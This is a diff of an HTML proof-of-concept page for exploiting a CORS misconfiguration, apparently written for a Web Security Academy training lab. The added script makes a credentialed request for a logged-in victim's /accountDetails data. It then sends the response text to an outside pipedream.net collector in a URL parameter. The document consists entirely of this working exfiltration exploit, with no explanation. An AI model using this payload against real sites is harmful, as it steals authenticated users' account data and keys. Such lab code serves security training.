@@ -1,22 +1,16 @@
 <html>
      <body>
-         <h2>CORS PoC</h2>
-         <div id="demo">
-             <button type="button" onclick="cors()">Exploit</button>
-         </div>
-         <script>
-             function cors() {
-             var xhr = new XMLHttpRequest();
-             xhr.onreadystatechange = function() {
-                 if (this.readyState == 4 && this.status == 200) {
-                 document.getElementById("demo").innerHTML = alert(this.responseText);
-                 }
-             };
-              xhr.open("GET",
-                       "https://victim.example.com/endpoint", true);
-             xhr.withCredentials = true;
-             xhr.send();
-             }
-         </script>
+          <h1>CORS PoC 1</h1>
+          <script>
+          var req = new XMLHttpRequest(); 
+          req.onload = reqListener; 
+          req.open('get','https://acf41fa41e924a5d80dbb21f005f00b0.web-security-academy.net/accountDetails',true); 
+          req.withCredentials = true;
+          req.send();
+
+          function reqListener() {
+              location='//end3cf3i9hdou.x.pipedream.net/?key='+this.responseText; 
+          };
+          </script>
      </body>
 </html>
